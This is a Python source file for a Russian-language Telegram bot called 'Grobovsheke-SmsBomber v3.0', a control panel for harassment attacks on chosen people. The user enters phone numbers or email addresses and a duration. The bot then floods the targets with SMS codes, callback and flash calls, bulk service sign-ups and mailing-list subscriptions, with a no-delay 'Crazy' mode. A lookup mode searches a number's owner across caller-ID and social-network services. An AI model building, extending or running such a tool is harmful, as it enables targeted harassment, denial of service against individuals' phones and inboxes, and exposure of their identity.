import os
import re
import json
import asyncio
import time
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, FSInputFile
from dotenv import load_dotenv

load_dotenv()

bot = Bot(token=os.getenv("TELEGRAM_BOT_TOKEN") or "")
dp = Dispatcher()

active_attacks = {}
user_settings = {}
user_filters = {}

# --- Настройки ---
def get_user_setting(uid, key, default=None):
    if uid not in user_settings:
        user_settings[uid] = {}
    return user_settings[uid].get(key, default)

def set_user_setting(uid, key, value):
    if uid not in user_settings:
        user_settings[uid] = {}
    user_settings[uid][key] = value

def get_attack_type(uid):
    return get_user_setting(uid, "type", "MIX")

def set_attack_type(uid, atype):
    set_user_setting(uid, "type", atype)

def get_user_filter(uid):
    return get_user_setting(uid, "filter", "ALL")

def set_user_filter(uid, country):
    set_user_setting(uid, "filter", country)

# --- Клавиатуры ---
def main_keyboard():
    kb = [
        [KeyboardButton(text="💣 Атака"), KeyboardButton(text="⏹ Стоп")],
        [KeyboardButton(text="📱 SMS"), KeyboardButton(text="📞 Звонки"), KeyboardButton(text="🔀 MIX")],
        [KeyboardButton(text="⚡ FlashCall"), KeyboardButton(text="📧 EmailBomb"), KeyboardButton(text="🔇 Тишина")],
        [KeyboardButton(text="🔥 Crazy"), KeyboardButton(text="🔍 Пробив"), KeyboardButton(text="📊 Статистика")],
        [KeyboardButton(text="🔧 Фильтр"), KeyboardButton(text="📤 Экспорт"), KeyboardButton(text="📖 Помощь")],
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def filter_keyboard():
    kb = [
        [KeyboardButton(text="🌍 Все страны"), KeyboardButton(text="🇷🇺 Россия")],
        [KeyboardButton(text="🇺🇿 Узбекистан"), KeyboardButton(text="🇺🇦 Украина")],
        [KeyboardButton(text="◀️ Назад")],
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

# Описания режимов
MODE_DESC = {
    "SMS": "📱 **SMS** — спам-регистрации на сайтах, SMS-коды",
    "CALL": "📞 **Звонки** — запросы обратного звонка",
    "MIX": "🔀 **MIX** — SMS + Звонки одновременно",
    "FLASHCALL": "⚡ **FlashCall** — прозвон (звонок и сброс)",
    "EMAIL": "📧 **EmailBomb** — регистрации на сайтах по email",
    "SUBSCRIBE": "🔇 **Тишина** — подписка номера на рассылки",
    "CRAZY": "🔥 **Crazy** — макс. скорость, все сервисы без задержек",
    "LOOKUP": "🔍 **Пробив** — поиск номера по базам (имя, соцсети)",
}

# --- Команды ---
@dp.message(Command("start"))
async def start_command(message: types.Message):
    uid = message.from_user.id
    atype = get_attack_type(uid)
    await message.answer(
        f"💣 **Grobovsheke-SmsBomber v3.0**\n\n"
        f"**8 режимов атаки:**\n" + "\n".join(MODE_DESC.values()) + "\n\n"
        f"⚙️ Текущий: **{atype}**\n"
        f"🌍 Фильтр: **{get_user_filter(uid)}**",
        reply_markup=main_keyboard()
    )

@dp.message(Command("help"))
async def help_command(message: types.Message):
    uid = message.from_user.id
    await message.answer(
        "📖 **Справка**\n\n"
        "**Запуск атаки:**\n"
        "`79123456789 5` — 1 номер на 5 мин\n"
        "`+79123456789,+79876543210 3` — несколько\n\n"
        "**Режимы:**\n"
        + "\n".join(MODE_DESC.values()) + "\n\n"
        "**EmailBomb:** `email@mail.com 5` — атака почты\n"
        "**Пробив:** `79123456789` — разовый поиск\n\n"
        "**Команды:**\n"
        "📊 Статистика — состояние сервисов\n"
        "📤 Экспорт — выгрузить список сервисов\n"
        "🔧 Фильтр — по стране\n"
        "/stats /reset /stop",
        reply_markup=main_keyboard()
    )

@dp.message(Command("stats"))
async def stats_command(message: types.Message):
    from Core.Attack.ServiceRegistry import get_summary_text, list_dead_services
    text = get_summary_text()
    dead = list_dead_services()
    if dead:
        text += f"\n💀 **Мёртвые ({len(dead)}):**\n" + "\n".join(dead[:10])
    await message.answer(text, reply_markup=main_keyboard())

@dp.message(Command("reset"))
async def reset_command(message: types.Message):
    from Core.Attack.ServiceRegistry import reset_stats, enable_all
    reset_stats()
    enable_all()
    await message.answer("✅ Статистика сброшена, все сервисы включены")

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_attacks and active_attacks[user_id]["status"] == "running":
        active_attacks[user_id]["status"] = "stopped"
        try:
            from Core.Run import stop_attacks
            stop_attacks()
        except:
            pass
        await message.answer("⏹️ **Атака остановлена!**", reply_markup=main_keyboard())
    else:
        await message.answer("❌ Нет активных атак.", reply_markup=main_keyboard())

# --- Атака ---
async def run_attack(message: types.Message, numbers_str: str, minutes: str, 
                     attack_type=None, email=None):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if attack_type is None:
        attack_type = get_attack_type(user_id)

    if attack_type == "LOOKUP":
        # Разовый поиск — без таймера
        await message.answer("🔍 **Поиск запущен...**", reply_markup=main_keyboard())
        numbers = [n.replace("+", "") for n in re.findall(r"\+?\d+", numbers_str)]
        if not numbers:
            await message.answer("❌ Некорректный номер!")
            return

        from Core.Attack.Services_Lookup import lookup_urls
        from Core.Run import make_request
        from aiohttp import ClientSession, ClientTimeout
        from asyncio import ensure_future, gather

        timeout = ClientTimeout(total=15)
        async with ClientSession(timeout=timeout) as session:
            tasks = []
            for url_data in lookup_urls(numbers[0]):
                tasks.append(ensure_future(make_request(session, url_data, "LOOKUP")))
            if tasks:
                results = await gather(*tasks, return_exceptions=True)
            else:
                results = []

        ok = sum(1 for r in results if r is not None and isinstance(r, tuple) and r[0] < 400)
        fail = sum(1 for r in results if r is None or (isinstance(r, tuple) and r[0] >= 400))

        await message.answer(
            f"🔍 **Поиск по номеру** `{numbers[0]}`\n\n"
            f"🔍 Запросов: {len(results)}\n"
            f"✅ Ответили: {ok}\n"
            f"❌ Ошибок: {fail}\n\n"
            f"💡 Данные в service_registry.json",
            reply_markup=main_keyboard()
        )
        return
    if attack_type == "EMAIL":
        email = numbers_str
        numbers = ["0000000000"]
        if not email or '@' not in email:
            await message.answer("❌ Введи email! Пример: `test@mail.ru 3`")
            return
    else:
        if not minutes.isdigit():
            await message.answer("❌ Время должно быть числом!")
            return
        mins = int(minutes)
        if mins < 1 or mins > 10:
            await message.answer("❌ Время от 1 до 10 минут!")
            return
        # Парсим номера
        numbers = []
        for n in re.findall(r'\+?\d+', numbers_str):
            n = n.replace('+', '')
            if len(n) >= 10 and n.isdigit():
                numbers.append(n)

    if not numbers:
        await message.answer("❌ Некорректные данные!")
        return

    # Останавливаем предыдущую атаку
    if user_id in active_attacks and active_attacks[user_id]["status"] == "running":
        try:
            from Core.Run import stop_attacks
            stop_attacks()
        except:
            pass

    from Core.Run import start_async_attacks
    from threading import Thread

    attack_id = int(time.time() * 1000)
    active_attacks[user_id] = {
        "numbers": numbers,
        "type": attack_type,
        "status": "running",
        "id": attack_id,
    }

    async def send_progress(text):
        try:
            await bot.send_message(chat_id, f"📊 **Прогресс:**\n{text}", parse_mode="Markdown")
        except:
            pass

    def progress_wrapper(text):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(send_progress(text))
            loop.close()
        except:
            pass

    def run(aid, nums):
        try:
            start_async_attacks(
                nums, minutes if minutes.isdigit() else "3",
                attack_type=attack_type,
                stop_previous=True,
                progress_callback=progress_wrapper,
                country_filter=get_user_filter(user_id),
                email=email,
            )
            current = active_attacks.get(user_id, {})
            if current.get("id") != aid:
                return
            if current.get("status") == "stopped":
                return
            active_attacks[user_id]["status"] = "completed"
            
            from Core.Attack.ServiceRegistry import get_summary_text
            final = f"✅ **{attack_type} завершён!**\n\n"
            if attack_type != "EMAIL":
                final += f"📱 Номера: `{' +'.join(nums)}`\n"
            final += f"⏱ Длительность: {minutes} мин.\n"
            final += f"MODE: {MODE_DESC.get(attack_type, attack_type)}\n\n"
            final += get_summary_text()
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(bot.send_message(chat_id, final, parse_mode="Markdown"))
            loop.close()
        except Exception as e:
            current = active_attacks.get(user_id, {})
            if current.get("id") != aid:
                return
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(bot.send_message(
                chat_id, f"❌ **Ошибка:**\n`{e}`", parse_mode="Markdown"))
            loop.close()

    Thread(target=run, args=(attack_id, numbers), daemon=True).start()

    targets = " +".join(numbers) if attack_type != "EMAIL" else email
    await message.answer(
        f"✅ **{attack_type} запущен!**\n"
        f"🎯 Цель: `{targets}`\n"
        f"⏱ Длительность: {minutes} мин.\n"
        f"MODE: {MODE_DESC.get(attack_type, attack_type)}",
        reply_markup=main_keyboard()
    )

# --- Обработка кнопок ---
@dp.message()
async def handle_text(message: types.Message):
    text = message.text.strip()
    uid = message.from_user.id
    
    if text == "💣 Атака":
        atype = get_attack_type(uid)
        await message.answer(
            "Введи цель и время атаки:\n\n"
            f"▪️ Номер: `79123456789 5`\n"
            f"▪️ Несколько: `+79123456789,+79876543210 3`\n"
            f"▪️ Email (в EmailBomb): `test@mail.ru 5`\n\n"
            f"⚙️ Текущий режим: **{atype}**\n"
            f"🌍 Фильтр: **{get_user_filter(uid)}**\n\n"
            f"{MODE_DESC.get(atype, '')}"
        )
    
    elif text in ("📱 SMS", "📞 Звонки", "🔀 MIX"):
        type_map = {"📱 SMS": "SMS", "📞 Звонки": "CALL", "🔀 MIX": "MIX"}
        atype = type_map[text]
        set_attack_type(uid, atype)
        await message.answer(f"✅ Режим изменён на **{atype}**", reply_markup=main_keyboard())
    
    elif text == "⚡ FlashCall":
        set_attack_type(uid, "FLASHCALL")
        await message.answer(
            "⚡ **FlashCall** — выбран!\n\n"
            "Введи номер и время: `79123456789 3`\n"
            "📞 Будет прозвон (flash call) — звонок и сброс",
            reply_markup=main_keyboard()
        )
    
    elif text == "📧 EmailBomb":
        set_attack_type(uid, "EMAIL")
        await message.answer(
            "📧 **EmailBomb** — выбран!\n\n"
            "Введи email и время: `target@mail.ru 3`\n"
            "📨 Письма на почту от разных сервисов",
            reply_markup=main_keyboard()
        )
    
    elif text == "🔇 Тишина":
        set_attack_type(uid, "SUBSCRIBE")
        await message.answer(
            "🔇 **Тишина** — выбран!\n\n"
            "Введи номер и время: `79123456789 3`\n"
            "📬 Подписка на все рассылки и SMS-уведомления",
            reply_markup=main_keyboard()
        )
    
    elif text == "🔥 Crazy":
        set_attack_type(uid, "CRAZY")
        await message.answer(
            "🔥 **Crazy** — выбран!\n\n"
            "Введи номер и время: `79123456789 3`\n"
            "💣 Максимальная скорость! SMS + Звонки + FlashCall без задержек",
            reply_markup=main_keyboard()
        )
    
    elif text == "🔍 Пробив":
        set_attack_type(uid, "LOOKUP")
        await message.answer(
            "🔍 **Пробив** — выбран!\n\n"
            "Просто введи номер: `79123456789`\n"
            "🔎 Поиск по базам: GetContact, TrueCaller, VK, Facebook",
            reply_markup=main_keyboard()
        )
    
    elif text == "📊 Статистика":
        await stats_command(message)
    
    elif text == "🔧 Фильтр":
        await message.answer(
            "🌍 **Выбери страну:**", reply_markup=filter_keyboard())
    
    elif text in ("🌍 Все страны", "🇷🇺 Россия", "🇺🇿 Узбекистан", "🇺🇦 Украина"):
        filter_map = {"🌍 Все страны": "ALL", "🇷🇺 Россия": "RU", "🇺🇿 Узбекистан": "UZ", "🇺🇦 Украина": "UA"}
        country = filter_map[text]
        set_user_filter(uid, country)
        await message.answer(f"✅ Фильтр: **{country}**", reply_markup=main_keyboard())
    
    elif text == "📤 Экспорт":
        from Core.Attack.Services import urls
        from Core.Attack.Services_Extra import extra_urls
        all_svc = urls('0000000000') + extra_urls('0000000000')
        export = [{"website": s['info']['website'], "attack": s['info']['attack'], 
                   "country": s['info']['country'], "url": s['url']} for s in all_svc]
        with open('/tmp/services_export.json', 'w') as f:
            json.dump(export, f, indent=2, ensure_ascii=False)
        await message.answer(
            f"📤 Всего: {len(export)} сервисов", reply_markup=main_keyboard())
        try:
            await message.answer_document(FSInputFile('/tmp/services_export.json'))
        except:
            pass
    
    elif text == "◀️ Назад":
        await start_command(message)
    elif text == "⏹ Стоп":
        await stop_command(message)
    elif text == "📖 Помощь":
        await help_command(message)
    elif text in ("ℹ️ О проекте",):
        await start_command(message)
    
    else:
        # Парсим ввод пользователя
        parts = text.split()
        attack_type = get_attack_type(uid)
        
        if attack_type == "LOOKUP" and len(parts) == 1:
            # Пробив — достаточно номера
            nums = re.findall(r'\+?\d+', parts[0])
            if nums:
                await run_attack(message, parts[0], "0", attack_type="LOOKUP")
                return
        
        if attack_type == "EMAIL" and len(parts) >= 1:
            if '@' in parts[0]:
                email = parts[0]
                minutes = parts[1] if len(parts) > 1 and parts[1].isdigit() else "3"
                await run_attack(message, email, minutes, attack_type="EMAIL")
                return
        
        if len(parts) >= 2:
            minutes = parts[-1]
            target = " ".join(parts[:-1])
            if minutes.isdigit() and 1 <= int(minutes) <= 10:
                nums = re.findall(r'\+?\d+', target)
                if nums or '@' in target:
                    await run_attack(message, target, minutes)
                    return
        
        await message.answer(
            "Используй кнопки ниже 👇", reply_markup=main_keyboard())

async def start_telegram_bot():
    await dp.start_polling(bot, handle_signals=False)
